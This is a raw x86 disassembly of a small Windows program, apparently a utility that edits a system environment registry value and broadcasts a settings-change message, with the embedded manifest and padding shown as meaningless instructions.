add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0




add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
or     %eax,(%eax,%eax,1)
add    %cl,0x0(%eax)
add    %al,(%eax)
pop    %eax
inc    %eax
add    %al,(%eax)
push   %esi
add    (%eax),%al
add    %ah,%ah
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%ecx,%eiz,2)
jae    0x4040cf
gs insl (%dx),%es:(%edi)
bound  %ebp,0x20(%ecx,%edi,2)
js     0x4040d1
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040a5
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x4040eb
data16 je 0x4040ac
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x4040ba
and    (%eax),%ah
insl   (%dx),%es:(%edi)
popa   
outsb  %ds:(%esi),(%dx)
imul   $0x65567473,0x65(%esi),%esp
jb     0x40410a
imul   $0x2e31223d,0x6e(%edi),%ebp
xor    %ah,(%edx)
ds or  $0x3c20200a,%eax
je     0x40411a
jne    0x40411d
je     0x4040f5
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
and    %bh,0x6d(%eax)
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040f3
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x404139
data16 je 0x4040fa
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x40410a
and    (%esi),%bh
or     $0x2020200a,%eax
and    %bh,(%ebx,%esi,2)
arpl   %si,%gs:0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

and    %ah,(%eax)
and    %ah,(%eax)
cmp    $0x72,%al
gs jno 0x40416b
gs jae 0x40416d
gs fs push %eax
jb     0x404167
jbe    0x404169
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x404144
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %ah,(%eax)
and    %bh,(%edx,%esi,2)
gs jno 0x40418a
gs jae 0x40418c
gs fs inc %ebp
js     0x404182
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
and    %ch,0x76(%ebp,%eiz,2)
gs insb (%dx),%es:(%edi)
cmp    $0x49736122,%eax
outsb  %ds:(%esi),(%dx)
jbe    0x4041a5
imul   $0x22,0x72(%ebp),%esp
and    %dh,0x69(%ebp)
inc    %ecx
arpl   %sp,0x65(%ebx)
jae    0x4041b6
cmp    $0x6c616622,%eax
jae    0x4041af
and    (%esi),%bh
cmp    $0x2f,%al
jb     0x4041b5
jno    0x4041c7
gs jae 0x4041c9
gs fs inc %ebp
js     0x4041bf
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
ds or  $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%edi,%ebp,1)
jb     0x4041d7
jno    0x4041e9
gs jae 0x4041eb
gs fs push %eax
jb     0x4041e5
jbe    0x4041e7
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x4041c2
or     $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
jae    0x4041f3
arpl   %si,0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

cmp    $0x2f,%al
je     0x40420f
jne    0x404212
je     0x4041ea
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
ds or  $0x3c20200a,%eax
fs gs jo 0x404213
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x2020200a,%eax
and    %bh,(%esp,%eiz,2)
gs jo  0x404225
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x404207
jae    0x40423b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%ecx,%eiz,2)
jae    0x40424d
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x40424e
je     0x404260
and    %dh,0x70(%ecx,%edi,2)
gs cmp $0x6e697722,%eax
xor    (%edx),%esi
and    (%eax),%ah
outsb  %ds:(%esi),(%dx)
popa   
insl   (%dx),%es:(%edi)
gs cmp $0x63694d22,%eax
jb     0x40426f
jae    0x404271
data16 je 0x404233
push   %esi
inc    %ebx
cmp    %esi,(%eax)
cs inc %ebx
push   %edx
push   %esp
and    (%eax),%ah
jbe    0x404276
jb     0x404286
imul   $0x2e39223d,0x6e(%edi),%ebp
xor    %ch,(%esi)
xor    (%ecx),%dh
xor    %dh,(%edx)
xor    (%esi),%ch
cmp    %ah,(%edx)
and    %dh,0x72(%eax)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40429c
jb     0x404270
jb     0x404294
push   $0x63657469
je     0x4042ad
jb     0x40429f
cmp    $0x36387822,%eax
and    (%eax),%ah
jo     0x4042b8
bound  %ebp,0x63(%ecx,%ebp,2)
dec    %ebx
gs jns 0x40429f
outsl  %ds:(%esi),(%dx)
imul   $0x3d,0x6e(%ebp),%esp
and    (%ecx),%dh
data16 arpl %di,(%eax)
bound  %esi,(%ebx)
bound  %edi,(%ecx)
popa   
xor    %esp,0x31(%ebp)
cmp    %ah,0x33(%ebp)
bound  %esp,(%edx)
ds cmp $0x2f,%al
popa   
jae    0x4042db
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x4042dc
je     0x4042ee
ds or  $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
fs gs jo 0x4042e7
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x4042c9
jae    0x4042fd
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x3c20200a,%eax
das    
fs gs jo 0x4042ff
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x612f3c0a,%eax
jae    0x40431b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
push   %eax
inc    %ecx




add    %dl,(%eax)
add    %al,(%eax)
test   %al,(%ecx)
add    %al,(%eax)
or     %esi,(%eax)
push   %ds
xor    %al,0x58(%eax,%esi,1)
xor    %bl,0x30(%esi)
jno    0x405044
xchg   %eax,%ebx
xor    %ah,-0x43cf49d0(%eax)
xor    %dl,%dl
xor    %bl,%dh
xor    %ch,%ah
xor    %dl,(%edi)
xor    %esp,(%ecx)
xor    %ebp,(%esi)
xor    %esi,(%ecx,%esi,1)
cmp    %esi,(%ecx)
push   $0x31
jae    0x405061
xorl   $0xffffff89,(%ecx)
xor    %ebx,-0x31ce49cf(%edi)
xor    %eax,(%edi)
xor    0x32(%esi),%ah
jb     0x405072
movsl  %ds:(%esi),%es:(%edi)
xor    0x32d832c2(%edx,%esi,1),%bh
in     (%dx),%eax
xor    (%edx),%al
xor    (%ebx,%esi,1),%edx
sub    %dh,(%ebx)
xor    %ss:0x33(%edi),%esp
je     0x405089
xorl   $0x33ab3396,(%ebx)
mov    $0x33,%al
mov    $0x33,%dh
(bad)  
xor    %eax,%esp
xor    %ebp,%esp
xor    %edi,%ebp
xor    %esi,%esi
xor    %esp,%edi
xor    (%ecx),%eax
xor    $0x6,%al
xor    $0xb,%al
xor    $0x10,%al
xor    $0x16,%al
xor    $0x1e,%al
xor    $0x32,%al
xor    $0x4d,%al
xor    $0x56,%al
xor    $0x71,%al
xor    $0x7b,%al
xor    $0x8e,%al
xor    $0x98,%al
xor    $0x9d,%al
xor    $0xa2,%al
xor    $0xc4,%al
xor    $0xc9,%al
xor    $0xd2,%al
xor    $0xd7,%al
xor    $0xe4,%al
xor    $0xf5,%al
xor    $0xfb,%al
xor    $0x2,%al
xor    $0x351b3516,%eax
and    %esi,0x352f3529
xor    $0x48354235,%eax
xor    $0x35703551,%eax
js     0x4050e5
xorl   $0x35ad359b,0x358f3587

mov    $0x735be35,%eax
ss or  $0x1c361536,%eax
and    %esi,%ss:(%esi)
daa    
ss sub $0x3b363536,%eax
ss inc %edx
ss dec %ecx
ss pop %ecx
ss popa 
ss addr16 ss jae 0x405112
jle    0x405114
pushf  
mov    %al,%ss:0xae36a836
ss mov $0x36,%ah
mov    $0xc836c136,%edx
ss iret 
ss (bad) 
fnsave %ss:(%esi)
in     $0x36,%al
jmp    0x40512e
repz ss sti 
add    %ss:(%edi),%esi
getsec 
sbb    %dh,(%edi)
sbb    $0x2d372337,%eax
aaa    
ss aaa 
inc    %ecx
aaa    
dec    %ebp
aaa    
push   %edx
aaa    
bound  %esi,(%edi)
addr16 aaa 
insl   (%dx),%es:(%edi)
aaa    
jae    0x40514f
mov    %esi,(%edi)
nop
aaa    
fnstenv (%edi)
fbstp  (%edi)
call   0xfa78405c
aaa    
add    %bh,(%eax)
adc    $0x38,%al
sub    %edi,(%eax)
xor    $0x38,%al
dec    %esp
cmp    %ah,0x38(%edx)
outsl  %ds:(%esi),(%dx)
cmp    %ch,0x38d238b1(%eax,%edi,1)
xlat   %ds:(%ebx)
cmp    %dh,%dh
cmp    %bl,-0x50c662c7(%eax)
cmp    %ecx,%ebp
cmp    %esp,%ecx
cmp    %esp,%edi
cmp    %edx,0x3a(%eax)
push   %esi
cmp    0x3a(%ebp),%bl
jp     0x40518c
(bad)  
cmp    %ah,%cl
cmp    (%ecx),%dl
cmp    (%ebx,%edi,1),%esi
inc    %ecx
cmp    0x3b(%ebp),%ecx
push   %ebp
cmp    0x3b(%ebp),%ebx
imul   $0x3b953b8d,(%ebx),%edi
mov    0xac3ba63b,%al
cmp    -0x41c447c5(%edx),%esi
cmp    %esp,%eax
cmp    %edx,%ecx
cmp    %eax,%edx
cmp    %esp,%ebx
cmp    %eax,%ebp
cmp    %esp,%esi
cmp    (%eax),%eax
cmp    $0x1c,%al
cmp    $0x0,%al
and    %al,(%eax)
add    %ch,(%eax,%eax,1)
add    %al,(%eax)
in     (%dx),%al
xor    %bh,%al
xor    %bh,%ah
xor    %ch,(%ecx,%esi,1)
xor    %dh,(%ecx)
inc    %esp
xor    0x33(%eax),%ecx
cld    
xor    (%eax),%eax
xor    $0x20,%al
xor    $0x3c,%al
xor    $0x40,%al
xor    $0x48,%al
xor    $0x50,%al
xor    $0x58,%al
xor    $0x60,%al
xor    $0x6c,%al
xor    $0x0,%al
add    %al,(%eax)
xor    %al,(%eax)
add    %cl,(%eax,%eax,1)
add    %al,(%eax)
sbb    %dh,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)







push   %esi
push   %edi
mov    %eax,%esi
lea    0x2(%eax),%edx
mov    (%eax),%cx
inc    %eax
inc    %eax
test   %cx,%cx
jne    0x401007
sub    %edx,%eax
sar    %eax
xor    %ecx,%ecx
push   $0x2
add    %eax,%eax
pop    %edx
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x4013c8
pop    %ecx
mov    $0x208,%edi
mov    %eax,%ecx
sub    %eax,%esi
lea    0x7ffffdf6(%edi),%edx
test   %edx,%edx
je     0x401050
movzwl (%esi,%ecx,1),%edx
test   %dx,%dx
je     0x401050
mov    %dx,(%ecx)
inc    %ecx
inc    %ecx
dec    %edi
jne    0x401035
test   %edi,%edi
pop    %edi
pop    %esi
jne    0x401058
dec    %ecx
dec    %ecx
xor    %edx,%edx
mov    %dx,(%ecx)
ret    
push   %ebp
mov    %esp,%ebp
push   %ecx
andl   $0x0,-0x4(%ebp)
push   %esi
lea    -0x4(%ebp),%eax
push   %eax
push   $0x1388
push   $0x2
push   $0x402114
push   $0x0
push   $0x1a
push   $0xffff
call   *0x4020c8
mov    %eax,%esi
test   %esi,%esi
jne    0x4010a1
call   *0x402018
push   %eax
push   $0x40212c
call   *0x4020b8
pop    %ecx
jmp    0x4010ac
push   $0x402158
call   *0x4020b8
pop    %ecx
mov    %esi,%eax
pop    %esi
leave  
ret    
push   %ebp
mov    %esp,%ebp
push   %esi
mov    0x4020b8,%esi
push   %edi
push   $0x4021bc
call   *%esi
pop    %ecx
pushl  0x18(%ebp)
pushl  0x14(%ebp)
pushl  0x10(%ebp)
push   $0x0
pushl  0xc(%ebp)
pushl  0x8(%ebp)
call   *0x40200c
mov    %eax,%edi
test   %edi,%edi
jne    0x4010eb
push   $0x4021cc
call   *%esi
jmp    0x4010f4
push   %edi
push   $0x4021dc
call   *%esi
pop    %ecx
pop    %ecx
mov    %edi,%eax
pop    %edi
pop    %esi
pop    %ebp
ret    
push   %ebp
mov    %esp,%ebp
sub    $0x1c,%esp
push   %ebx
push   %esi
push   %edi
push   $0x402200
call   *0x4020b8
mov    $0x2000,%ebx
xor    %esi,%esi
push   %ebx
mov    %esi,-0x18(%ebp)
call   0x4013c8
mov    $0x200000,%edi
push   %edi
mov    %eax,-0x4(%ebp)
movl   $0x1000,-0x14(%ebp)
call   0x4013c8
add    $0xc,%esp
lea    -0x10(%ebp),%ecx
push   %ecx
push   %eax
mov    %eax,-0x8(%ebp)
lea    -0x1c(%ebp),%eax
push   %eax
push   %esi
lea    -0x14(%ebp),%eax
push   %eax
pushl  -0x4(%ebp)
push   %esi
mov    0x402008,%esi
jmp    0x4011f3
pushl  -0x4(%ebp)
push   $0x402214
call   *0x4020b4
pushl  -0x8(%ebp)
push   $0x402228
call   *0x4020b4
pushl  -0x1c(%ebp)
push   $0x40223c
call   *0x4020b4
add    $0x18,%esp
mov    $0x402250,%eax
call   0x401000
mov    -0x4(%ebp),%ecx
mov    (%ecx),%dx
cmp    (%eax),%dx
jne    0x4011b7
test   %dx,%dx
je     0x4011b3
mov    0x2(%ecx),%dx
cmp    0x2(%eax),%dx
jne    0x4011b7
add    $0x4,%ecx
add    $0x4,%eax
test   %dx,%dx
jne    0x401191
xor    %eax,%eax
jmp    0x4011bc
sbb    %eax,%eax
sbb    $0xffffffff,%eax
test   %eax,%eax
je     0x401229
incl   -0x18(%ebp)
push   %ebx
call   0x4013c8
push   %edi
mov    %eax,-0x4(%ebp)
movl   $0x1000,-0x14(%ebp)
call   0x4013c8
pop    %ecx
pop    %ecx
lea    -0x10(%ebp),%ecx
push   %ecx
push   %eax
mov    %eax,-0x8(%ebp)
lea    -0x1c(%ebp),%eax
push   %eax
push   $0x0
lea    -0x14(%ebp),%eax
push   %eax
pushl  -0x4(%ebp)
pushl  -0x18(%ebp)
pushl  0x8(%ebp)
movl   $0x100000,-0x10(%ebp)
call   *%esi
mov    %eax,-0xc(%ebp)
test   %eax,%eax
je     0x401157
mov    $0xea,%esi
cmp    %esi,%eax
jne    0x4012fb
push   $0x402278
call   *0x4020b8
mov    %esi,%eax
jmp    0x40130d
mov    -0x8(%ebp),%eax
lea    0x2(%eax),%edx
mov    (%eax),%cx
inc    %eax
inc    %eax
test   %cx,%cx
jne    0x40122f
sub    %edx,%eax
sar    %eax
mov    %eax,%edi
mov    $0x4022ac,%esi
mov    %esi,%eax
call   0x401000
lea    0x2(%eax),%ecx
mov    (%eax),%dx
inc    %eax
inc    %eax
test   %dx,%dx
jne    0x40124e
sub    %ecx,%eax
sar    %eax
add    %edi,%eax
push   $0x2
xor    %ecx,%ecx
pop    %edi
lea    0x2(%eax,%eax,1),%eax
mov    %edi,%edx
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x4013c8
mov    %eax,%ebx
pop    %ecx
mov    %esi,%eax
call   0x401000
mov    %ebx,%edx
movzwl (%eax),%ecx
mov    %cx,(%edx)
add    %edi,%eax
add    %edi,%edx
test   %cx,%cx
jne    0x401284
mov    -0x8(%ebp),%eax
mov    %eax,%edx
mov    (%eax),%cx
add    %edi,%eax
test   %cx,%cx
jne    0x401298
sub    %edx,%eax
mov    %ebx,%edi
dec    %edi
dec    %edi
mov    0x2(%edi),%cx
inc    %edi
inc    %edi
test   %cx,%cx
jne    0x4012a8
mov    %eax,%ecx
shr    $0x2,%ecx
mov    %edx,%esi
rep movsl %ds:(%esi),%es:(%edi)
mov    %eax,%ecx
and    $0x3,%ecx
push   %ebx
push   $0x40225c
rep movsb %ds:(%esi),%es:(%edi)
call   *0x4020b4
pop    %ecx
mov    %ebx,%eax
pop    %ecx
lea    0x2(%eax),%ecx
mov    (%eax),%dx
inc    %eax
inc    %eax
test   %dx,%dx
jne    0x4012d6
sub    %ecx,%eax
sar    %eax
add    %eax,%eax
push   %eax
push   %ebx
pushl  -0x1c(%ebp)
pushl  -0x4(%ebp)
pushl  0x8(%ebp)
call   0x4010b2
add    $0x14,%esp
jmp    0x40130e
pushl  -0xc(%ebp)
push   $0x40228c
call   *0x4020b8
mov    -0xc(%ebp),%eax
pop    %ecx
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
leave  
ret    
push   %ebp
mov    %esp,%ebp
push   %ecx
push   %esi
push   $0x208
call   0x4013c8
mov    0x4020b8,%esi
movl   $0x402174,(%esp)
call   *%esi
pop    %ecx
lea    -0x4(%ebp),%eax
push   %eax
push   $0xf003f
push   $0x0
mov    $0x4022c8,%eax
call   0x401000
push   %eax
push   $0x80000002
call   *0x402000
test   %eax,%eax
jne    0x401375
push   $0x402188
call   *%esi
pop    %ecx
pushl  -0x4(%ebp)
call   0x4010fb
pop    %ecx
test   %eax,%eax
je     0x401384
push   $0x402344
call   *%esi
jmp    0x40137e
push   %eax
push   $0x402198
call   *%esi
pop    %ecx
xor    %eax,%eax
pop    %ecx
inc    %eax
jmp    0x4013ae
pushl  -0x4(%ebp)
call   *0x402004
test   %eax,%eax
je     0x40139f
call   *0x402018
push   %eax
push   $0x402350
jmp    0x40137b
push   $0x402370
call   *%esi
pop    %ecx
call   0x40105e
xor    %eax,%eax
pop    %esi
leave  
ret    
call   0x401313
xor    %eax,%eax
ret    
cmp    0x403000,%ecx
jne    0x4013c3
repz ret 
jmp    0x40167a
jmp    *0x4020bc
push   $0x4018b8
call   0x40187b
mov    0x403364,%eax
movl   $0x40302c,(%esp)
pushl  0x403360
mov    %eax,0x40302c
push   $0x40301c
push   $0x403020
push   $0x403018
call   *0x4020ac
add    $0x14,%esp
mov    %eax,0x403028
test   %eax,%eax
jge    0x401418
push   $0x8
call   0x4017d0
pop    %ecx
ret    
push   $0x10
push   $0x402468
call   0x401a4c
xor    %ebx,%ebx
mov    %ebx,-0x4(%ebp)
mov    %fs:0x18,%eax
mov    0x4(%eax),%esi
mov    %ebx,-0x1c(%ebp)
mov    $0x40337c,%edi
push   %ebx
push   %esi
push   %edi
call   *0x40203c
cmp    %ebx,%eax
je     0x401461
cmp    %esi,%eax
jne    0x401454
xor    %esi,%esi
inc    %esi
mov    %esi,-0x1c(%ebp)
jmp    0x401464
push   $0x3e8
call   *0x402040
jmp    0x40143b
xor    %esi,%esi
inc    %esi
mov    0x403378,%eax
cmp    %esi,%eax
jne    0x401477
push   $0x1f
call   0x4017d0
pop    %ecx
jmp    0x4014b2
mov    0x403378,%eax
test   %eax,%eax
jne    0x4014ac
mov    %esi,0x403378
push   $0x4020e8
push   $0x4020dc
call   0x401a44
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x4014b2
movl   $0xfffffffe,-0x4(%ebp)
mov    $0xff,%eax
jmp    0x401589
mov    %esi,0x403034
mov    0x403378,%eax
cmp    %esi,%eax
jne    0x4014d6
push   $0x4020d8
push   $0x4020d0
call   0x401a3e
pop    %ecx
pop    %ecx
movl   $0x2,0x403378

cmp    %ebx,-0x1c(%ebp)
jne    0x4014e3
push   %ebx
push   %edi
call   *0x402044
cmp    %ebx,0x403388
je     0x401504
push   $0x403388
call   0x401980
pop    %ecx
test   %eax,%eax
je     0x401504
push   %ebx
push   $0x2
push   %ebx
call   *0x403388
mov    0x40301c,%eax
mov    0x402068,%ecx
mov    %eax,(%ecx)
pushl  0x40301c
pushl  0x403020
pushl  0x403018
call   0x4013b1
add    $0xc,%esp
mov    %eax,0x403030
cmp    %ebx,0x403024
jne    0x40156f
push   %eax
call   *0x40209c
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%ecx
mov    %ecx,-0x20(%ebp)
push   %eax
push   %ecx
call   0x4018de
pop    %ecx
pop    %ecx
ret    
mov    -0x18(%ebp),%esp
mov    -0x20(%ebp),%eax
mov    %eax,0x403030
xor    %ebx,%ebx
cmp    %ebx,0x403024
jne    0x40156f
push   %eax
call   *0x4020a4
cmp    %ebx,0x403034
jne    0x40157d
call   *0x4020a8
movl   $0xfffffffe,-0x4(%ebp)
mov    0x403030,%eax
call   0x401a91
ret    
mov    $0x5a4d,%eax
cmp    %ax,0x400000
je     0x4015a1
xor    %eax,%eax
jmp    0x4015ee
mov    0x40003c,%eax
lea    0x400000(%eax),%eax
cmpl   $0x4550,(%eax)
jne    0x40159d
movzwl 0x18(%eax),%ecx
cmp    $0x10b,%ecx
je     0x4015db
cmp    $0x20b,%ecx
jne    0x40159d
cmpl   $0xe,0x84(%eax)
jbe    0x40159d
xor    %ecx,%ecx
cmp    %ecx,0xf8(%eax)
jmp    0x4015e9
cmpl   $0xe,0x74(%eax)
jbe    0x40159d
xor    %ecx,%ecx
cmp    %ecx,0xe8(%eax)
setne  %cl
mov    %ecx,%eax
push   $0x1
mov    %eax,0x403024
call   *0x402070
push   $0xffffffff
call   *0x40206c
pop    %ecx
pop    %ecx
mov    %eax,0x403380
mov    %eax,0x403384
call   *0x4020c0
mov    0x40336c,%ecx
mov    %ecx,(%eax)
call   *0x402064
mov    0x403368,%ecx
mov    %ecx,(%eax)
mov    0x402060,%eax
mov    (%eax),%eax
mov    %eax,0x403374
call   0x401892
call   0x401af5
cmpl   $0x0,0x403014
jne    0x401656
push   $0x401af5
call   *0x40205c
pop    %ecx
call   0x401aca
cmpl   $0xffffffff,0x403010
jne    0x40166d
push   $0xffffffff
call   *0x402058
pop    %ecx
xor    %eax,%eax
ret    
call   0x401af8
jmp    0x401419
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x328,%esp
mov    %eax,0x403140
mov    %ecx,0x40313c
mov    %edx,0x403138
mov    %ebx,0x403134
mov    %esi,0x403130
mov    %edi,0x40312c
data16 mov %ss,0x403158
data16 mov %cs,0x40314c
data16 mov %ds,0x403128
data16 mov %es,0x403124
data16 mov %fs,0x403120
data16 mov %gs,0x40311c
pushf  
popl   0x403150
mov    0x0(%ebp),%eax
mov    %eax,0x403144
mov    0x4(%ebp),%eax
mov    %eax,0x403148
lea    0x8(%ebp),%eax
mov    %eax,0x403154
mov    -0x320(%ebp),%eax
movl   $0x10001,0x403090

mov    0x403148,%eax
mov    %eax,0x403044
movl   $0xc0000409,0x403038

movl   $0x1,0x40303c

mov    0x403000,%eax
mov    %eax,-0x328(%ebp)
mov    0x403004,%eax
mov    %eax,-0x324(%ebp)
call   *0x402028
mov    %eax,0x403088
push   $0x1
call   0x401b8e
pop    %ecx
push   $0x0
call   *0x40202c
push   $0x40210c
call   *0x402030
cmpl   $0x0,0x403088
jne    0x40176c
push   $0x1
call   0x401b8e
pop    %ecx
push   $0xc0000409
call   *0x402034
push   %eax
call   *0x402038
leave  
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    (%eax),%eax
cmpl   $0xe06d7363,(%eax)
jne    0x4017bc
cmpl   $0x3,0x10(%eax)
jne    0x4017bc
mov    0x14(%eax),%eax
cmp    $0x19930520,%eax
je     0x4017b7
cmp    $0x19930521,%eax
je     0x4017b7
cmp    $0x19930522,%eax
je     0x4017b7
cmp    $0x1994000,%eax
jne    0x4017bc
call   0x401b94
xor    %eax,%eax
pop    %ebp
ret    $0x4
push   $0x401780
call   *0x40202c
xor    %eax,%eax
ret    
jmp    *0x4020b0
push   $0x14
push   $0x402488
call   0x401a4c
pushl  0x403384
mov    0x40208c,%esi
call   *%esi
pop    %ecx
mov    %eax,-0x1c(%ebp)
cmp    $0xffffffff,%eax
jne    0x401805
pushl  0x8(%ebp)
call   *0x402088
pop    %ecx
jmp    0x40186c
push   $0x8
call   0x401ba6
pop    %ecx
andl   $0x0,-0x4(%ebp)
pushl  0x403384
call   *%esi
mov    %eax,-0x1c(%ebp)
pushl  0x403380
call   *%esi
pop    %ecx
pop    %ecx
mov    %eax,-0x20(%ebp)
lea    -0x20(%ebp),%eax
push   %eax
lea    -0x1c(%ebp),%eax
push   %eax
pushl  0x8(%ebp)
mov    0x40206c,%esi
call   *%esi
pop    %ecx
push   %eax
call   0x401ba0
mov    %eax,-0x24(%ebp)
pushl  -0x1c(%ebp)
call   *%esi
mov    %eax,0x403384
pushl  -0x20(%ebp)
call   *%esi
add    $0x14,%esp
mov    %eax,0x403380
movl   $0xfffffffe,-0x4(%ebp)
call   0x401872
mov    -0x24(%ebp),%eax
call   0x401a91
ret    
push   $0x8
call   0x401b9a
pop    %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x8(%ebp)
call   0x4017d6
neg    %eax
sbb    %eax,%eax
neg    %eax
pop    %ecx
dec    %eax
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
mov    $0x402458,%eax
mov    $0x402458,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x4018b5
mov    (%edi),%eax
test   %eax,%eax
je     0x4018ae
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x4018a6
pop    %edi
pop    %esi
ret    
mov    %edi,%edi
push   %esi
mov    $0x402460,%eax
mov    $0x402460,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x4018db
mov    (%edi),%eax
test   %eax,%eax
je     0x4018d4
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x4018cc
pop    %edi
pop    %esi
ret    
jmp    *0x4020a0
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%ecx
mov    $0x5a4d,%eax
cmp    %ax,(%ecx)
je     0x401906
xor    %eax,%eax
pop    %ebp
ret    
mov    0x3c(%ecx),%eax
add    %ecx,%eax
cmpl   $0x4550,(%eax)
jne    0x401902
xor    %edx,%edx
mov    $0x10b,%ecx
cmp    %cx,0x18(%eax)
sete   %dl
mov    %edx,%eax
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    0x3c(%eax),%ecx
add    %eax,%ecx
